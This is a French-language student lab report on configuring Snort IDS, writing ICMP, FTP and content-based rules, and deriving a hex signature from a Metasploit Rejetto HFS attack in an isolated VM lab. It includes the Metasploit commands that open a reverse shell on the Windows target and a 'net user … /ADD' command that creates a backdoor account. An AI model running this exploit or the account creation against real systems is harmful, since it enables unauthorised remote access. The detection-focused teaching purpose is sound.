# TP4: Snort IDS/IPS - Rapport de Laboratoire

## Laboratoire de Sécurité des Systèmes Informatiques

---

## 📋 Table des Matières

1. [Configuration de l'Environnement](#configuration)
2. [Partie 1: Snort en Mode IDS](#partie-1)
3. [Partie 2: Snort en Mode Logger et Simulation d'Attaque](#partie-2)
4. [Partie 3: Création de Règles Personnalisées](#partie-3)
5. [Analyse et Conclusions](#conclusions)

---

## 🎯 Objectifs du TP

Dans ce laboratoire, nous avons:

- Installé et configuré Snort comme système de détection d'intrusion (IDS)
- Créé des règles Snort personnalisées pour détecter des activités suspectes
- Analysé le trafic réseau capturé avec Wireshark
- Simulé une attaque réelle et développé des règles de détection

---

## 🖥️ Configuration de l'Environnement {#configuration}

### Machines Virtuelles Utilisées

- **Ubuntu Desktop** - Installation de Snort (Interface: ens33)
- **Windows Server 2012 R2** - Système cible avec serveur FTP
- **Kali Linux** - Machine d'attaque avec Metasploit

Toutes les VM sont connectées au même réseau pour permettre la communication.

---

## 🔍 Partie 1: Snort en Mode IDS {#partie-1}

### 1. Installation de Snort

J'ai téléchargé et installé Snort sur mon système Ubuntu Desktop. L'installation a été réalisée avec succès.

**Commande de vérification**:

```bash
snort -V
```

![Installing Snort](instaling-snort.png)

**Résultat**: La version de Snort installée s'affiche correctement.

---

### 2. Visualisation de la Configuration Réseau

J'ai utilisé la commande `ifconfig` pour afficher ma configuration réseau et identifier les informations nécessaires pour la configuration de Snort:

- Interface réseau: **ens33** (Ubuntu Desktop)
- Adresse IP locale
- Configuration du sous-réseau

**Commande utilisée**:

```bash
ifconfig
```

![Viewing Network Configuration](2.Viewing-Network-Configuration.png)

**Note**: J'utilise Ubuntu Desktop avec l'interface ens33 pour faciliter l'utilisation de l'environnement graphique.

---

### 3. Configuration de HOME_NET

La configuration du réseau protégé (HOME_NET) est une étape cruciale pour que Snort sache quel réseau surveiller.

**Étapes de configuration**:

1. Ouverture du fichier de configuration Snort

   ```bash
   sudo nano /etc/snort/snort.conf
   ```

   _(Note: J'utilise nano car gedit n'est pas installé et je préfère travailler avec cet éditeur)_

2. Modification de la variable `ipvar HOME_NET` pour correspondre à mon sous-réseau
3. Sauvegarde de la configuration

![Configuring HOME_NET](3.-Configuring-HOME_NET.png)

**Important**: La valeur HOME_NET doit inclure le masque de sous-réseau (exemple: `192.168.x.0/24`).

---

### 3.2. Vérification de la Configuration

Avant de démarrer Snort en mode opérationnel, il est essentiel de tester la configuration pour s'assurer qu'il n'y a pas d'erreurs.

**Commande de test**:

```bash
sudo snort -T -i ens33 -c /etc/snort/snort.conf
```

**Options expliquées**:

- `-T`: Mode test de configuration
- `-i ens33`: Interface réseau à surveiller
- `-c`: Chemin du fichier de configuration

![Verifying Configuration](3.2.-Verifying-Configuration.png)

**Résultat**: Le test de configuration a réussi, confirmant que Snort est correctement configuré.

---

### 4. Création de Règles Snort

#### Comprendre la Syntaxe des Règles

Une règle Snort se compose de deux parties principales:

**En-tête de règle**:

```
alert icmp any any -> $HOME_NET any
```

- `alert`: Action à effectuer (générer une alerte)
- `icmp`: Protocole à surveiller
- `any any`: IP source et port source (tous)
- `->`: Direction du trafic
- `$HOME_NET any`: IP destination et port destination

**Options de règle**:

```
(msg:"ICMP test"; sid:1000001; classtype:icmp-event;)
```

- `msg`: Message descriptif de l'alerte
- `sid`: Identifiant unique de la règle (>1000000 pour règles personnalisées)
- `classtype`: Catégorie de classification

#### Création de la Première Règle ICMP

La vérification initiale a montré que 0 règles Snort étaient chargées. J'ai créé ma première règle dans le fichier `local.rules` pour détecter le trafic ICMP.

![Creating Rules](4.-Creating-Rules.png)

![Creating Rules](4.1.-Creating-Rules.png)

**Règle ICMP créée**:

```
alert icmp any any -> $HOME_NET any (msg:"ICMP test"; sid:1000001; classtype:icmp-event;)
```

J'ai ensuite relancé le test de configuration pour vérifier que la règle était correctement chargée.

![Creating Rules](4.2.-Creating-Rules.png)

**Résultat**: "1 Snort rules read" confirme que notre règle est active.

---

### 5. Démarrage de Snort en Mode IDS

J'ai démarré Snort en mode détection d'intrusion avec affichage des alertes dans la console.

**Commande utilisée**:

```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i ens33
```

**Options expliquées**:

- `-A console`: Afficher les alertes dans la console
- `-q`: Mode silencieux (sans bannière de démarrage)
- `-c`: Fichier de configuration
- `-i`: Interface réseau à surveiller

**Observation**: L'écran semble figé - c'est le comportement normal, Snort attend du trafic à analyser.

---

### 6. Test de Détection ICMP

J'ai effectué un ping depuis la machine Kali Linux vers mon système Ubuntu pour tester la détection ICMP.

**Sur Kali Linux**:

```bash
ping 192.168.12.129
```

À mon retour sur la console Snort, j'ai observé la génération de multiples alertes pour chaque paquet ICMP, confirmant que la règle fonctionnait correctement.

![Testing ICMP Detection](6.-Testing-ICMP-Detection.png)

![Testing ICMP Detection](6.1.-Testing-ICMP-Detection.png)

**Résultat**: Chaque paquet ICMP (echo request et echo reply) a déclenché une alerte, prouvant l'efficacité de notre règle de détection.

---

### 7. Création d'une Règle de Détection FTP

Pour une détection plus ciblée, j'ai créé une deuxième règle spécifique pour surveiller les tentatives de connexion FTP depuis Kali Linux.

**Règle FTP créée**:

```
alert tcp 192.168.12.148 any -> $HOME_NET 21 (msg:"FTP connection attempt"; sid:1000002; rev:1;)
```

**Explication de la règle**:

- `tcp`: Protocole TCP uniquement
- `192.168.12.148`: IP source spécifique (Kali Linux)
- `21`: Port FTP standard
- `rev:1`: Numéro de révision de la règle

![Creating an FTP Connection Rule](7.-Creating-an-FTP-Connection-Rule.png)

![Creating an FTP Connection Rule](7.1.-Creating-an-FTP-Connection-Rule.png)

**Préparation du serveur FTP** pour les tests:

---

### 8. Exécution de Snort avec Logging ASCII

J'ai redémarré Snort avec l'option de logging ASCII activée pour enregistrer les détails des paquets dans un format lisible.

**Commande utilisée**:

```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i ens33 -K ascii
```

**Nouvelle option**:

- `-K ascii`: Enregistrer les logs au format ASCII (texte lisible)

![Running Snort with ASCII Logging](8.-Running-Snort-with-ASCII-Logging.png)

**Avantage**: Les logs ASCII permettent une analyse manuelle plus facile du contenu des paquets.

---

### 9. Test de Détection de Connexion FTP

Depuis la VM Kali Linux, j'ai initié une connexion FTP vers mon système Ubuntu. Cette action a déclenché la règle de connexion FTP et généré des alertes dans la console Snort.

**Commande FTP sur Kali**:

```bash
ftp 192.168.12.139
```

![Testing FTP Connection Detection](9.-Testing-FTP-Connection-Detection.png)

**Résultat**: La tentative de connexion FTP a été immédiatement détectée et signalée.

---

### 10. Vérification de la Génération d'Alertes

La console Snort a affiché les alertes pour les tentatives de connexion FTP comme prévu, confirmant que la règle fonctionnait correctement.

**Test depuis Kali Linux**:

![Verifying Alert Generation](10.-Verifying-Alert-Generation.png)

![Verifying Alert Generation](10.1-Verifying-Alert-Generation.png)

**Vérification des faux positifs** - Test depuis Ubuntu pour s'assurer que les connexions légitimes locales ne déclenchent pas de fausses alertes:

**Analyse**: La règle détecte correctement les connexions depuis l'IP source spécifiée (Kali) sans générer de faux positifs.

---

### 11. Examen des Logs Snort

J'ai utilisé la commande `ls /var/log/snort` pour visualiser le répertoire des logs Snort, qui contient:

- Fichiers `snort.log.*` au format pcap
- Répertoires organisés par adresse IP source pour les alertes

**Commandes d'analyse**:

```bash
ls /var/log/snort
sudo ls /var/log/snort/192.168.12.148/
```

![Examining Snort Logs](11.-Examining-Snort-Logs.png)

![Examining Snort Logs-using logs](11.-Examining-Snort-Logs-using-logs.png)

![Examining Snort Logs](11Examining-Snort-Logs-11.-Examining-Snort-Logs.png.png)

**Organisation des logs**: Snort organise automatiquement les alertes par adresse IP source, facilitant l'analyse des activités suspectes par machine.

J'ai ensuite examiné le contenu des logs d'alertes pour une analyse détaillée.

---

### 11.2. Analyse des Paquets avec Wireshark

J'ai utilisé Wireshark pour analyser les paquets capturés et obtenir une vue détaillée du trafic réseau.

**Commande de lancement**:

```bash
sudo wireshark
```

J'ai ouvert le fichier `ftp-capture.pcap` pour examiner les informations détaillées des paquets. _(Note: J'ai dû copier le fichier depuis les logs car il ne s'ouvrait pas directement)_

![Analyzing Packets with Wireshark](11.2.-Analyzing-Packets-with-Wireshark.png)

**Analyse Wireshark**: L'outil permet d'examiner chaque couche protocolaire (Ethernet, IP, TCP, Application) et de comprendre le contenu exact des communications FTP.

---

### 12-14. Test avec Windows Server

J'ai vérifié l'adresse IP de ma machine Windows Server 2012 et me suis connecté à son serveur FTP avec des identifiants invalides, générant le message d'erreur "Login or password incorrect".

**Étapes effectuées**:

1. Identification de l'IP du Windows Server:
   ```cmd
   ipconfig
   ```

![Testing with Windows Server](12-14.-Testing-with-Windows-Server.png)

2. Tentative de connexion depuis Ubuntu:

![Trying to connect from ubuntu](Trying-to-connect-from-ubuntu.png)

**Observation**: Le message d'erreur "Login or password incorrect" sera utilisé comme signature pour notre prochaine règle de détection.

---

### 15. Création d'une Règle de Détection d'Échec de Connexion

J'ai créé une troisième règle pour détecter les tentatives de connexion FTP échouées, basée sur le contenu du message d'erreur.

**Règle de détection d'échec créée**:

```
alert tcp $HOME_NET 21 -> any any (msg:"FTP failed login"; content:"Login or password incorrect"; sid:1000003; rev:1;)
```

![Creating a Failed Login Detection Rule](15.-Creating-a-Failed-Login-Detection-Rule.png)

**Points importants de cette règle**:

- `$HOME_NET 21`: Source = notre réseau, port 21 (serveur FTP)
- `-> any any`: Vers n'importe quelle destination
- `content:"..."`: Recherche de texte spécifique dans le contenu du paquet

**Application**: Cette règle permet de détecter des tentatives de brute-force ou des attaques par dictionnaire contre le serveur FTP.

---

### 16. Test de la Règle d'Échec de Connexion

J'ai testé la règle en tentant de me connecter au serveur FTP avec des identifiants invalides. La règle a détecté avec succès les tentatives de connexion échouées et généré des alertes dans Snort.

![Testing the Failed Login Rule](16.-Testing-the-Failed-Login-Rule.png)

![Testing the Failed Login Rule](16.1.-Testing-the-Failed-Login-Rule.png)

**Conclusion de la Partie 1**: Cette première partie du TP a démontré la création et le test de règles basiques pour la détection d'intrusion, incluant la surveillance ICMP et FTP. Les règles créées permettent de détecter à la fois les tentatives de connexion et les échecs d'authentification.

---

## 📦 Partie 2: Snort en Mode Logger et Simulation d'Attaque {#partie-2}

### Objectif

Capturer le trafic d'une attaque réelle avec Metasploit, puis analyser les paquets pour créer une règle de détection personnalisée.

---

### 1. Lancement de Metasploit et Configuration de l'Exploit

J'ai lancé Metasploit sur Kali Linux et configuré l'exploit Rejetto HFS avec les paramètres appropriés (payload, LHOST, RHOST, RPORT).

**Commandes Metasploit**:

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.12.148  # IP de Kali Linux
set RHOST 192.168.12.149  # IP de Windows Server
set RPORT 8081
```

![Exo2.1](Exo2.1.png)

**Contexte**: L'exploit Rejetto HFS cible une vulnérabilité dans le serveur HTTP File Server (HFS) pour obtenir un shell distant sur la machine cible.

---

### 2. Configuration de Snort en Mode Logging

J'ai configuré Snort en mode logging pour enregistrer toutes les connexions et le trafic réseau pendant l'attaque.

**Commande Snort en mode Logger**:

```bash
sudo snort -dev -q -l /var/log/snort -i ens33
```

**Options expliquées**:

- `-d`: Dump du contenu des paquets
- `-e`: Afficher les en-têtes Ethernet
- `-v`: Mode verbeux
- `-l`: Répertoire de logging
- `-q`: Mode silencieux

![Exo2.2](Exo2.2.png)

**Objectif**: Capturer tout le trafic de l'attaque pour une analyse post-exploitation.

---

### 3. Exécution de l'Attaque et Capture du Trafic

#### 3.1 Lancement du Serveur HFS Vulnérable

Le serveur HFS vulnérable a été lancé sur Windows Server pour simuler une cible réelle.

![Exo2- 3.1](Exo2--3.1.png)

#### 3.2 Exécution de l'Exploit

J'ai exécuté l'exploit depuis Metasploit:

```bash
exploit
```

![Exo2- 3.2](Exo2--3.2.png)

**Résultat**: Obtention d'un shell Windows distant sur le serveur cible.

#### 3.3 Capture du Trafic par Snort

Snort a capturé tout le trafic de l'attaque, incluant:

- La communication initiale avec le serveur HFS
- L'exploitation de la vulnérabilité
- L'établissement du shell inversé
- Les commandes exécutées sur la machine compromise

![Exo2- 3.3.snort captured](Exo2--3.3.snort-captured.png)

**Importance**: Cette capture contient l'empreinte complète de l'attaque.

---

### 4. Exécution de Commandes sur le Système Compromis

Après avoir obtenu l'accès au shell Windows, j'ai créé un compte utilisateur et exécuté d'autres commandes pour démontrer le contrôle total du système.

**Commandes exécutées**:

```cmd
net user chakibtest P@ssword12 /ADD
cd \
mkdir chakibtest
```

![Exo2-4](Exo2-4.png)

**Conséquences**: Ces actions représentent ce qu'un attaquant réel pourrait faire après avoir compromis un système.

---

### 5. Recherche des Paquets dans Wireshark

J'ai ouvert la capture Snort dans Wireshark pour localiser les paquets contenant l'activité malveillante.

**Méthode de recherche**:

1. Ouverture du fichier `snort.log.*` dans Wireshark
2. Utilisation de la fonction de recherche (`Edit` → `Find Packet`)
3. Recherche de chaînes spécifiques (nom d'utilisateur créé, commandes, etc.)

![Exo2-5png](Exo2-5png.png)

**Résultat**: Wireshark a trouvé les paquets contenant les commandes malveillantes.

---

### 6. Suivi des Flux TCP

J'ai utilisé la fonction "Follow TCP Stream" de Wireshark pour reconstituer l'intégralité de la communication entre l'attaquant et la victime.

**Méthode**:

1. Sélection d'un paquet pertinent
2. Clic droit → `Follow` → `TCP Stream`

![Exo2-6](Exo2-6.png)

**Observation**: La fenêtre de flux TCP affiche toutes les commandes tapées durant l'attaque:

- La création d'utilisateur
- La navigation dans les dossiers
- Toutes les actions de l'attaquant

**C'est l'empreinte complète de l'attaque reconstituée!**

---

### 7. Identification de la Chaîne Signature

En remontant dans les paquets, j'ai trouvé la chaîne caractéristique indiquant qu'un shell a été obtenu via l'exploit Rejetto HFS.

**Signature identifiée**:

```
C:\Users\Administrator\Desktop\hfs2.3b>
```

![Exo2-7](Exo2-7.png)

**Importance**: Ce chemin spécifique est une signature unique de l'exploit Rejetto HFS. Sa présence dans le trafic réseau indique une compromission réussie.

**Application**: Cette signature sera utilisée pour créer une règle de détection personnalisée.

---

## 🛡️ Partie 3: Création de Règles Personnalisées {#partie-3}

### Objectif

Développer des règles Snort avancées basées sur le contenu textuel et hexadécimal pour détecter l'exploitation Rejetto HFS.

---

### 1. Création d'une Règle Basée sur du Contenu Texte

J'ai ajouté une nouvelle règle dans le fichier `local.rules` pour détecter la signature textuelle de l'exploit Rejetto HFS.

**Règle de détection basée sur du texte**:

```
alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"C:\\Users\\Administrator\\Desktop\\hfs2.3b"; sid:1000004; rev:1;)
```

![exo3-1](exo3-1.png)

**Explication de la règle**:

- Détecte le trafic sortant de notre réseau (shell inversé)
- Recherche la chaîne caractéristique du shell Rejetto
- Chaque `\` doit être échappé avec `\\` dans les règles Snort
- `sid:1000004`: Identifiant unique pour cette règle personnalisée

**Application**: Cette règle détecte immédiatement une compromission réussie par l'exploit Rejetto HFS.

---

### 2. Test de la Règle de Détection Textuelle

Après avoir relancé Snort avec la nouvelle règle, j'ai réexécuté l'exploit depuis Metasploit pour tester la détection.

**Commande de démarrage Snort**:

```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i ens33
```

![exo3-2](exo3-2.png)

**Résultat**: Multiples alertes "Command Shell Access" ont été générées, confirmant que la règle détecte correctement l'activité malveillante!

**Analyse**: Chaque paquet contenant le prompt du shell a déclenché une alerte, prouvant l'efficacité de la détection basée sur le contenu.

---

### 3. Création d'une Règle avec Contenu Hexadécimal

Pour une détection plus précise et résistante à l'obfuscation, j'ai créé une règle basée sur les valeurs hexadécimales.

#### Pourquoi l'Hexadécimal?

**Avantages**:

- Détecte le contenu binaire, encodé ou obfusqué
- Plus précis que le texte simple
- Résistant aux variations d'encodage
- Peut cibler des patterns non imprimables

#### Préparation de la Règle Hexadécimale

J'ai copié la règle existante (`sid:1000004`) et modifié le numéro de révision pour préparer la nouvelle version.

**Processus**:

1. Copie de la règle avec `rev:1`
2. Commentaire de l'ancienne version
3. Modification de `rev:1` en `rev:2` pour la nouvelle version

![exo3-3](exo3-3.png)

**Bonne pratique**: Les numéros de révision permettent de tracer l'évolution des règles.

---

### 4. Extraction et Intégration du Contenu Hexadécimal

J'ai utilisé Wireshark pour extraire la représentation hexadécimale de la signature d'attaque.

**Méthode d'extraction**:

1. Sélection du paquet contenant `C:\Users\Administrator\Desktop\hfs2.3b>` dans Wireshark
2. Dans le panneau du milieu, sélection de la ligne "Data"
3. Clic droit → `Copy` → `Bytes` → `Offset Hex`
4. Nettoyage des valeurs hexadécimales:
   - Suppression des espaces
   - Suppression des offsets (numéros de ligne)
   - Conservation uniquement des valeurs hexadécimales
5. Encadrement avec des pipes `|valeurs_hex|`

**Règle finale avec contenu hexadécimal**:

```
alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"|43 3a 5c 55 73 65 72 73 5c 41 64 6d 69 6e 69 73 74 72 61 74 6f 72 5c 44 65 73 6b 74 6f 70 5c 68 66 73 32 2e 33 62 3e|"; sid:1000004; rev:2;)
```

![exo3-4](exo3-4.png)

**Note**: Le caractère `>` (3e en hexadécimal) est inclus dans cette version, ce qui rend la règle plus précise.

---

### 5. Test de la Règle Hexadécimale

J'ai testé la règle hexadécimale en relançant l'exploit et en observant les alertes générées.

**Résultat**:

![exo3-5](exo3-5.png)

**Observation importante**: Cette fois, seulement **2 alertes** ont été générées au lieu de 4 avec la règle textuelle!

**Analyse comparative**:

| Type de Règle                  | Nombre d'Alertes | Précision     |
| ------------------------------ | ---------------- | ------------- |
| Contenu texte (sans `>`)       | 4 alertes        | Moins précise |
| Contenu hexadécimal (avec `>`) | 2 alertes        | Plus précise  |

**Explication**:

- La règle hexadécimale inclut le caractère `>` qui apparaît moins fréquemment
- Réduit les faux positifs en ciblant spécifiquement le prompt complet
- Détection plus précise et plus fiable

**Conclusion**: Les règles hexadécimales offrent une détection plus granulaire et sont préférables pour les signatures complexes.

---

## 📊 Analyse et Conclusions {#conclusions}

### Compétences Acquises

Au cours de ce laboratoire, nous avons développé les compétences suivantes:

✅ **Installation et Configuration**

- Installation de Snort sur Ubuntu
- Configuration du réseau protégé (HOME_NET)
- Validation de la configuration Snort

✅ **Création de Règles de Détection**

- Règles ICMP pour la détection de ping
- Règles TCP pour le monitoring FTP
- Règles basées sur le contenu (content matching)
- Règles hexadécimales avancées

✅ **Analyse de Trafic Réseau**

- Capture de paquets avec Snort
- Analyse avec Wireshark
- Suivi de flux TCP
- Identification de signatures d'attaque

✅ **Simulation d'Attaque Réelle**

- Configuration d'exploits Metasploit
- Capture de trafic malveillant
- Analyse post-exploitation
- Développement de contre-mesures

---

### Concepts Clés

#### Structure d'une Règle Snort

```
action protocol source_ip source_port direction dest_ip dest_port (options)
```

#### Actions Principales

- `alert`: Génère une alerte et log
- `log`: Enregistre uniquement le paquet
- `pass`: Ignore le paquet
- `drop`: Bloque le paquet (mode IPS)
- `reject`: Bloque et envoie une réponse (mode IPS)

#### Options de Règles Importantes

| Option      | Description                 | Exemple                  |
| ----------- | --------------------------- | ------------------------ |
| `msg`       | Message de l'alerte         | `msg:"ICMP test"`        |
| `sid`       | ID unique (>1000000 custom) | `sid:1000001`            |
| `rev`       | Numéro de révision          | `rev:1`                  |
| `content`   | Contenu à rechercher        | `content:"Login failed"` |
| `classtype` | Catégorie de la règle       | `classtype:icmp-event`   |

#### Modes de Snort

**1. Mode Sniffer** (`-v`)

- Affiche les paquets en temps réel
- Utile pour le débogage

**2. Mode Logger** (`-l`)

- Enregistre les paquets dans des fichiers
- Format pcap pour analyse ultérieure

**3. Mode IDS** (`-c`)

- Détecte selon des règles prédéfinies
- Génère des alertes pour activités suspectes

---

### Statistiques du Laboratoire

**Règles Créées**: 4 règles personnalisées

- 1 règle ICMP (sid:1000001)
- 1 règle FTP connexion (sid:1000002)
- 1 règle FTP échec login (sid:1000003)
- 2 versions règle exploit detection (sid:1000004 rev:1 et rev:2)

**Attaques Simulées**: 1 exploitation Rejetto HFS

- Obtention de shell distant
- Création de compte utilisateur
- Exécution de commandes arbitraires

**Outils Utilisés**:

- Snort (IDS/IPS)
- Wireshark (Analyse de paquets)
- Metasploit (Framework d'exploitation)
- Kali Linux (Plateforme d'attaque)
- Windows Server 2012 R2 (Système cible)
- Ubuntu Desktop (Système de détection)

---

### Comparaison: Règles Texte vs Hexadécimales

**Règles Basées sur du Texte**

- ✅ Plus faciles à lire et maintenir
- ✅ Idéales pour les signatures ASCII claires
- ❌ Sensibles aux variations d'encodage
- ❌ Ne détectent pas le contenu binaire

**Règles Basées sur l'Hexadécimal**

- ✅ Plus précises et granulaires
- ✅ Détectent le contenu binaire/encodé
- ✅ Résistantes à l'obfuscation
- ✅ Moins de faux positifs
- ❌ Plus difficiles à créer et maintenir
- ❌ Moins lisibles

**Recommandation**: Utiliser les règles hexadécimales pour les signatures critiques nécessitant une précision maximale, et les règles textuelles pour les détections générales.

---

### Faux Positifs vs Faux Négatifs

**Faux Positif**: Alerte générée pour du trafic légitime

- **Impact**: Surcharge de travail pour les analystes
- **Solution**: Affiner les règles, ajouter des critères plus spécifiques

**Faux Négatif**: Absence d'alerte pour une attaque réelle

- **Impact**: Compromission non détectée (critique!)
- **Solution**: Élargir les règles, tester avec différents scénarios

**Équilibre**: Une bonne règle minimise les deux types d'erreurs.

---

### Limitations et Améliorations Possibles

#### Limitations Identifiées

1. **Dépendance aux Signatures**

   - Snort détecte uniquement les attaques connues
   - Nouvelles techniques d'attaque non détectées

2. **Performance**

   - L'inspection profonde des paquets consomme des ressources
   - Impact sur les réseaux à haut débit

3. **Chiffrement**
   - Le trafic HTTPS/TLS n'est pas inspecté
   - Les attaquants peuvent utiliser le chiffrement pour éviter la détection

#### Améliorations Possibles

1. **Règles Communautaires**

   - Intégrer les règles Snort Community/VRT
   - Mises à jour régulières des signatures

2. **Apprentissage Automatique**

   - Utiliser l'IA pour détecter les anomalies
   - Détection des attaques zero-day

3. **Corrélation d'Événements**

   - Intégrer avec un SIEM (Security Information and Event Management)
   - Analyse contextuelle multi-sources

4. **Mode IPS**

   - Passer du mode IDS (détection) au mode IPS (prévention)
   - Blocage automatique des attaques

5. **Inspection SSL/TLS**
   - Déchiffrement et inspection du trafic chiffré
   - Nécessite une infrastructure PKI appropriée

---

### Checklist de Réalisation du TP

- [x] Snort installé et vérifié
- [x] HOME_NET correctement configuré
- [x] Configuration testée avec succès
- [x] Règle ICMP créée et testée (sid:1000001)
- [x] Règle FTP connexion créée et testée (sid:1000002)
- [x] Règle FTP échec login créée et testée (sid:1000003)
- [x] Logs Snort examinés (format ASCII et PCAP)
- [x] Analyse Wireshark effectuée
- [x] Attaque Metasploit exécutée avec succès
- [x] Trafic malveillant capturé et analysé
- [x] Flux TCP reconstitué
- [x] Signature d'attaque identifiée
- [x] Règle de détection textuelle créée (sid:1000004 rev:1)
- [x] Règle de détection hexadécimale créée (sid:1000004 rev:2)
- [x] Toutes les règles testées et validées

---

### Perspectives et Applications Pratiques

**Environnements Applicables**:

- Réseaux d'entreprise
- Centres de données
- Infrastructures critiques
- Environnements cloud (avec adaptations)

**Cas d'Usage Réels**:

1. **Détection d'Intrusions**

   - Monitoring 24/7 du trafic réseau
   - Alertes en temps réel

2. **Analyse Forensique**

   - Investigation post-incident
   - Reconstitution des attaques

3. **Conformité Réglementaire**

   - PCI-DSS (Payment Card Industry Data Security Standard)
   - HIPAA (Health Insurance Portability and Accountability Act)
   - RGPD (Règlement Général sur la Protection des Données)

4. **Threat Hunting**
   - Recherche proactive de menaces
   - Analyse des IOC (Indicators of Compromise)

---

### Ressources Complémentaires

**Documentation Officielle**:

- [Snort User Manual](https://www.snort.org/documents)
- [Snort Rule Writing Guide](https://www.snort.org/documents)
- [Wireshark User Guide](https://www.wireshark.org/docs/)

**Règles Communautaires**:

- Snort Community Rules
- Emerging Threats Rules
- VRT (Vulnerability Research Team) Rules

**Outils Complémentaires**:

- **Suricata**: IDS/IPS alternatif moderne
- **Zeek (Bro)**: Analyse de trafic réseau
- **Security Onion**: Distribution Linux intégrée pour la sécurité réseau
- **OSSEC**: HIDS (Host-based IDS)

---

## 🎓 Conclusion Finale

Ce laboratoire a démontré l'importance d'un système de détection d'intrusion bien configuré pour identifier et analyser les activités malveillantes sur un réseau. Nous avons progressé depuis la configuration de base de Snort jusqu'à la création de règles de détection sophistiquées basées sur l'analyse d'une attaque réelle.

**Points Clés à Retenir**:

1. **Configuration Méticuleuse**: Une configuration correcte (HOME_NET, interfaces, règles) est essentielle pour une détection efficace.

2. **Règles Personnalisées**: La capacité de créer des règles adaptées aux menaces spécifiques est cruciale pour une défense proactive.

3. **Analyse Approfondie**: L'utilisation combinée de Snort et Wireshark permet une compréhension complète des attaques.

4. **Détection Multicouche**: Combiner différents types de règles (ICMP, TCP, contenu, hexadécimal) offre une protection plus robuste.

5. **Itération et Amélioration**: Les règles doivent être testées, affinées et mises à jour régulièrement pour maintenir leur efficacité.

**Prochaines Étapes Recommandées**:

- Explorer les règles communautaires Snort
- Apprendre l'optimisation des performances de Snort
- Étudier l'intégration avec des SIEM
- Pratiquer avec d'autres types d'attaques (SQL injection, XSS, etc.)
- Expérimenter avec le mode IPS (prévention)
- Approfondir l'analyse forensique avec Wireshark

La cybersécurité est un domaine en constante évolution. Les compétences acquises dans ce TP constituent une base solide pour développer une expertise approfondie en détection d'intrusions et défense réseau.

---

**Rapport réalisé par**: Aoudia Nour Islam  
**Date**: Décembre 2025  
**Environnement**: Ubuntu Desktop, Windows Server 2012 R2, Kali Linux  
**Outils**: Snort 2.x, Wireshark, Metasploit Framework
